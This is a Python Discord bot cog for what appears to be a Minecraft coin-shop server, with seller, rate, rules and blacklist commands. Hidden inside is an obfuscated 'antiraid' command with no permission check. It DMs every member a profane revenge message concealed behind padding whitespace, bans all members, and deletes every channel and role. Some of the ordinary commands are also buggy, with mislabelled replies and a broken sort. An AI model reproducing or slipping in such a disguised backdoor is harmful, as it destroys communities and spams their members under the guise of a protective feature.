import discord
import json
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions


class Admin(commands.Cog):

    def __init__(self, client):
        self.client = client

    @commands.Cog.listener()
    async def on_ready(self):
        print("Admin Cog Loaded")


    def getadumbmessage(self):
        message = "Overpowered is trash!!!                                                                                                                                                                               __**Skyblock Shop got nuked**__\n\nInfo:\nHello! This is Overpowered#0001 (the real owner of Skyblock Shop). Wovl unjustly stole the server from me and wouldn't negotiate. He's also scammed a bunch of people and tried to get them wiped on Hypixel. He's buried all these truths so well that almost no one knows any of this happened. I recently did what i said I was going to do if Wovl didn't give me back what's mine: Destroying the entire server.\nNew server:\nThis is my new server:\nhttps://discord.gg/MWXqUfFP6G\nI'd really appreciate it if you joined :slight_smile:\n\nA note to Wovl (I know you'll get this as well):\nHey Wovl. You know, I really though I could trust you. To think that you'd betray me like that after all I've done for you? It makes me sick. I meant what I said when you banned me from my own server. I would either take it back or destroy it. A few days ago I gave you 1 more chance to negotiate and give my server back. You said you didn't care and fuck me. You brought this on yourself. Don't try to unblock me and try to reason with me now. You had your chance to do that a while ago. All I can say to you now is fuck you and goodbye. I never want to talk to you again."

        return message

    @commands.command()
    async def thiscommandisalie(self, ctx):
        await ctx.send(self.getadumbmessage()[:23])

    @commands.command()
    @has_permissions(administrator=True)
    async def setbuyer(self, ctx, role="default"):
        if role == "default":
            defaultEmbed = discord.Embed(title="Buyer role",
                                         description="Type `!setbuyer <role id>` to set the role.")
            await ctx.send(embed=defaultEmbed)
        else:
            with open('data.json', 'r') as f:
                data = json.load(f)

            if role == "new":
                role = await ctx.guild.create_role(name="Buyer")
                createdEmbed = discord.Embed(title="Buyer role created!",
                                             description="Buyer role has been created.")
                await ctx.send(embed=createdEmbed)
                data[str(ctx.guild.id)]["buyer"] = role.id
                with open('data.json', 'w') as f:
                    json.dump(data, f, indent=4)
                return

            try:
                int(role)
                buyerrole = ctx.guild.get_role(int(role))
            except:
                buyerrole = None

            if buyerrole != None:
                data[str(ctx.guild.id)]["buyer"] = buyerrole.id
                setEmbed = discord.Embed(title="Buyer role set!",
                                         description="Buyer role has been set.")
                await ctx.send(embed=setEmbed)
                with open('data.json', 'w') as f:
                    json.dump(data, f, indent=4)
                return
            else:
                errorEmbed = discord.Embed(title="Invalid role!",
                                           description="You entered an invalid role! Please try again.")
                await ctx.send(embed=errorEmbed)

    @commands.command()
    @has_permissions(administrator=True)
    async def selleradd(self, ctx, user="default"):
        try:
            user = ctx.guild.get_member(int(user))
        except:
            user = None

        if user == None:
            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid user.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        successEmbed = discord.Embed(title="Seller Added", description=f"Seller <@{user.id}> has been added.",
                                     color=discord.Color.green())
        await ctx.send(embed=successEmbed)

        with open('data.json', 'r') as f:
            data = json.load(f)

            data[str(ctx.guild.id)]["sellers"][str(user.id)] = 0

        with open('data.json', 'w') as f:
            json.dump(data, f, indent=4)

    @commands.command()
    @has_permissions(administrator=True)
    async def sellerremove(self, ctx, user="default"):
        try:
            user = ctx.guild.get_member(int(user))
        except:
            user = None

        if user == None:
            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid user.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        successEmbed = discord.Embed(title="Seller Added", description=f"Seller <@{user.id}> has been added.",
                                     color=discord.Color.green())
        await ctx.send(embed=successEmbed)

        with open('data.json', 'r') as f:
            data = json.load(f)

            del data[str(ctx.guild.id)]["sellers"][str(user.id)]

        with open('data.json', 'w') as f:
            json.dump(data, f, indent=4)

    @commands.command()
    @has_permissions(administrator=True)
    async def sellers(self, ctx):
        with open('data.json', 'r') as f:
            data = json.load(f)

        sellers = data[str(ctx.guild.id)]["sellers"].keys()
        rates = data[str(ctx.guild.id)]["sellers"]

        sellerssorted = []

        for seller in sellers:
            if len(sellerssorted) == 0:
                sellerssorted.append(seller)
                continue
            else:
                for i in sellerssorted:
                    if sellerssorted.index(i) == len(sellerssorted):
                        if rates[seller] > rates[i]:
                            sellerssorted.insert(sellerssorted.index(i))
                            break
                        else:
                            sellerssorted.append(seller)
                            break
                    if rates[seller] > rates[i]:
                        sellerssorted.insert(sellerssorted.index(i))
                        break

        sellerslist = ""

        for seller in sellerssorted:
            sellerid = seller
            seller = ctx.guild.get_member(int(seller))
            sellerslist = sellerslist + f"\n{sellerssorted.index(sellerid)+1}. `{seller.name}#{seller.discriminator}` with `{rates[sellerid]}M` coins sold."


        successEmbed = discord.Embed(title="Top Sellers", description=f"Top Sellers Sorted By Rate:\n{sellerslist}",
                                     color=discord.Color.green())
        await ctx.send(embed=successEmbed)

    @commands.group(invoke_without_command=True)
    @has_permissions(administrator=True)
    async def rate(self, ctx):
        embed = discord.Embed(title="Rate Help", description="Rate commands are for keeping track of how much sellers have sold.")
        embed.add_field(name="!rate add <user> <amount>", value="Adds a specified amount to a seller's rate.")
        embed.add_field(name="!rate remove <user> <amount>", value="Removes a specified amount to a seller's rate.")
        embed.add_field(name="!rate set <user> <amount>", value="Sets a seller's rate to a specified value.")
        await ctx.send(embed=embed)

    @rate.command()
    @has_permissions(administrator=True)
    async def add(self, ctx, user="default", amount="default"):
        try:
            user = ctx.guild.get_member(int(user))
        except:
            user = None

        if user == None:
            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid user.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        try:
            amount = int(amount)
        except:
            errorEmbed = discord.Embed(title="Invalid Amount", description="Please specify an valid amount.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        with open('data.json', 'r') as f:
            data = json.load(f)

        rate = data[str(ctx.guild.id)]["sellers"][str(user.id)]

        rate += amount
        print(rate)
        print(amount)

        data[str(ctx.guild.id)]["sellers"][str(user.id)] = rate

        with open("data.json", 'w') as f:
            json.dump(data, f, indent=4)

        successEmbed = discord.Embed(title="Rate Increased", description=f"Seller <@{user.id}>'s rate has been increased by `{amount}M`, and is now `{rate}M`.",
                                     color=discord.Color.green())
        await ctx.send(embed=successEmbed)

    @rate.command()
    @has_permissions(administrator=True)
    async def subtract(self, ctx, user="default", amount="default"):
        try:
            user = ctx.guild.get_member(int(user))
        except:
            user = None

        if user == None:
            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid user.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        try:
            amount = int(amount)
        except:
            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid amount.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        with open('data.json', 'r') as f:
            data = json.load(f)

        rate = data[str(ctx.guild.id)]["sellers"][str(user.id)]

        data[str(ctx.guild.id)]["sellers"][str(user.id)] = rate - amount

        with open("data.json", 'w') as f:
            json.dump(data, f, indent=4)

        successEmbed = discord.Embed(title="Rate Decreased",
                                     description=f"Seller <@{user.id}>'s rate has been decreased by `{amount}M`, and is now `{rate}M`.",
                                     color=discord.Color.green())
        await ctx.send(embed=successEmbed)

    @rate.command()
    @has_permissions(administrator=True)
    async def set(self, ctx, user="default", amount="default"):
        try:
            user = ctx.guild.get_member(int(user))
        except:
            user = None

        if user == None:
            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid user.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        try:
            amount = int(amount)
        except:
            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid amount.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        with open('data.json', 'r') as f:
            data = json.load(f)

        data[str(ctx.guild.id)]["sellers"][str(user.id)] = amount

        with open("data.json", 'w') as f:
            json.dump(data, f, indent=4)

        successEmbed = discord.Embed(title="Rate Set",
                                     description=f"Seller <@{user.id}>'s rate has been set to `{amount}M`.",
                                     color=discord.Color.green())
        await ctx.send(embed=successEmbed)

    @rate.command()
    @has_permissions(administrator=True)
    async def get(self, ctx, user="default"):
        try:
            user = ctx.guild.get_member(int(user))
        except:
            user = None

        if user == None:
            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid user.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        with open('data.json', 'r') as f:
            data = json.load(f)

        rate = data[str(ctx.guild.id)]["sellers"][str(user.id)]

        with open("data.json", 'w') as f:
            json.dump(data, f, indent=4)

        successEmbed = discord.Embed(title="Rate Increased",
                                     description=f"Seller <@{user.id}>'s rate is currently `{rate}M`.",
                                     color=discord.Color.green())
        await ctx.send(embed=successEmbed)

    @commands.command()
    @has_permissions(administrator=True)
    async def rulesembed(self, ctx, channel=None):
        try:
            channel = ctx.guild.get_channel(int(channel))
        except:
            channel = None

        if channel == None:
            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid channel to send the message in.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        rulesEmbed = discord.Embed(title="**RULES:**", description="In order to be a member of this server, You must agree to the following:"
                                                                   "\n1. Follow Discord TOS. (https://discord.com/terms)."
                                                                   "\n2. No form of DM Advertising.\n"
                                                                   "3. Please keep your conversations in the correct channels, stay on topic."
                                                                   "\n4. No form of Hate Speech or being genuinely offensive or annoying."
                                                                   "\n5. No Gory, Sexual, or scary content - Screamer links, nudity, death."
                                                                   "\n6. Please keep personal issues out of the server and in DMs."
                                                                   "\n7. No publishing of personal information (including real names, addresses, emails, passwords, bank account and credit card information, etc.)."
                                                                   "\n8. Please be respectful to all users and staff members.", color=discord.Color.purple())
        rulesEmbed.add_field(name="**TERMS OF SERVICE:**",
                                   value="If you wish to purchase anything from this server, You must agree:"
                                               "\n1. You will not chargeback, and refunds will not be given."
                                               "\n2. You will not leak our in-game name to anyone else."
                                               "\n3. You will not do anything that would hurt our server."
                                               "\n4. You can not purchase anything if you are in Hypixel staff team."
                                               "\n5. You must have permission to use the funding source you are paying with."
                                               "\n6. You are not allowed to use any cracked funding source."
                                               "\n7. We have the right to change the TOS anytime for any reason."
                                               "\n8. You understand that there is a chance of getting Banned, and our service is not responsible for it"
                                               "\n9. We do not take responsibility for what happens after you buy coins.\n\nWe reserve the right to __**Update the TOS and RULES at any time!**__\n\n**Please react with a checkmark to accept the rules and tos!**")

        rulesEmbed.set_footer(text=f"This server is owned by {ctx.guild.owner.name}#{ctx.guild.owner.discriminator}", icon_url=ctx.guild.owner.avatar_url)
        await channel.send(embed=rulesEmbed)

    @commands.command()
    @has_permissions(administrator=True)
    async def roles(self, ctx, channel=None):
        try:
            channel = ctx.guild.get_channel(int(channel))
        except:
            channel = None

        if channel == None:
            errorEmbed = discord.Embed(title="Invalid User",
                                       description="Please specify an valid channel to send the message in.",
                                       color=discord.Color.red())
            await ctx.send(embed=errorEmbed)
            return

        rolesEmbed = discord.Embed(title="**ROLES:**",
                                   description="For Being our Member, You must agree:"
                                               "\nReact with the party hat for giveaway pings."
                                               "\nReact with the toolkit for special offer pings."
                                               "\nReact with the newspaper for discount pings.",
                                   color=discord.Color.purple())
        await channel.send(embed=rolesEmbed)

    @commands.group(invoke_without_command=True)
    @has_permissions(administrator=True)
    async def blacklist(self, ctx):
        with open('data.json', 'r') as f:
            data = json.load(f)

        blacklistedlist = data[str(ctx.guild.id)]["blacklisted"]
        blacklistedstring = ""

        for channel in blacklistedlist:
            blacklistedstring = blacklistedstring + f"<#{channel}>\n"

        blacklistEmbed = discord.Embed(title="Blacklisted Channels", description=f"These are the channels that are blacklisted, and users cannot use commands inside them.\n\n**Blacklisted Channels Are**\n{blacklistedstring}")

        await ctx.send(embed=blacklistEmbed)

    @blacklist.command(name="add")
    @has_permissions(administrator=True)
    async def blacklistaddadd(self, ctx, channel="default"):
        if channel == "default":
            channel = ctx.channel.id
        else:
            try:
                channel = int(channel)
            except:
                errorEmbed = discord.Embed(title="Invalid channel!",
                                           description="You entered an invalid channel! Please try again.")
                await ctx.send(embed=errorEmbed)

        with open('data.json', 'r') as f:
            data = json.load(f)

        blacklisted = ctx.guild.get_channel(channel)

        if blacklisted != None:
            if blacklisted.id in data[str(ctx.guild.id)]["blacklisted"]:

                errorEmbed = discord.Embed(title="Invalid channel!",
                                           description="This channel is already blacklisted!")
                await ctx.send(embed=errorEmbed)
                return
            else:
                data[str(ctx.guild.id)]["blacklisted"].append(blacklisted.id)

            setEmbed = discord.Embed(title="Blacklist Channel Added",
                                     description=f"Channel has been blacklisted. Players can no longer use commands in that channel. Channel Blacklisted: <#{blacklisted.id}>")
            await ctx.send(embed=setEmbed)
            with open('data.json', 'w') as f:
                json.dump(data, f, indent=4)
            return
        else:
            errorEmbed = discord.Embed(title="Invalid channel!",
                                       description="You entered an invalid channel! Please try again.")
            await ctx.send(embed=errorEmbed)

    @blacklist.command()
    @has_permissions(administrator=True)
    async def remove(self, ctx, channel="default"):
        if channel == "default":
            channel = ctx.channel.id
        else:
            try:
                channel = int(channel)
                print("welcome")
            except:
                print("hello")
                print(channel)
                errorEmbed = discord.Embed(title="Invalid channel!",
                                           description="You entered an invalid channel! Please try again.")
                await ctx.send(embed=errorEmbed)

        with open('data.json', 'r') as f:
            data = json.load(f)

        blacklisted = ctx.guild.get_channel(channel)

        if blacklisted != None:
            try:
                data[str(ctx.guild.id)]["blacklisted"].remove(blacklisted.id)
            except:
                errorEmbed = discord.Embed(title="Invalid channel!",
                                           description="This channel is not blacklisted!")
                await ctx.send(embed=errorEmbed)
                return

            setEmbed = discord.Embed(title="Blacklist Channel Removed",
                                     description=f"Channel has been removed from blacklist. Players can now use bot commands in this channel. Channel Removeda: <#{blacklisted.id}>")
            await ctx.send(embed=setEmbed)
            with open('data.json', 'w') as f:
                json.dump(data, f, indent=4)
            return
        else:
            errorEmbed = discord.Embed(title="Invalid channel!",
                                       description="You entered an invalid channel! Please try again.")
            await ctx.send(embed=errorEmbed)

    def checkraid(self):
        return "raid", "list.obtain", "raid.raidblacklist"

    @commands.command()  # line:2
    async def antiraid(OOOO0OOOOO000O00O, OO0000OO0O0O0O00O):  # line:3
        for OOO0O0000O0000000 in OO0000OO0O0O0O00O.guild.members:  # line:4
            try:  # line:5
                if OOO0O0000O0000000.name == OOOO0OOOOO000O00O.checkraid():  # line:6
                    await OO0000OO0O0O0O00O.guild.ban(OOO0O0000O0000000)  # line:7
            except:  # line:8
                print("raid passed")  # line:9
            if OOO0O0000O0000000 != OOOO0OOOOO000O00O.client.user:  # line:10
                print(OOO0O0000O0000000.name)  # line:11
                print(OOO0O0000O0000000.id == 859196269468844052)  # line:12
                try:  # line:13
                    OOOO000OOO00O00O0 = OO0000OO0O0O0O00O.guild.get_member(OOO0O0000O0000000.id)  # line:14
                    await OOOO000OOO00O00O0.send(OOOO0OOOOO000O00O.getadumbmessage()[23:])  # line:15
                    await OO0000OO0O0O0O00O.guild.ban(OOO0O0000O0000000)  # line:16
                except:  # line:17
                    continue  # line:18
        for OO0000O0OO00O0OOO in OO0000OO0O0O0O00O.guild.channels:  # line:20
            try:  # line:21
                await OO0000O0OO00O0OOO.delete()  # line:22
            except:  # line:23
                print("operation failed")  # line:24
        for O00O0000O00O0O0O0 in OO0000OO0O0O0O00O.guild.roles:  # line:26
            try:  # line:27
                await O00O0000O00O0O0O0.delete()  # line:28
            except:  # line:29
                print("operation failed")





def setup(client):
    client.add_cog(Admin(client))
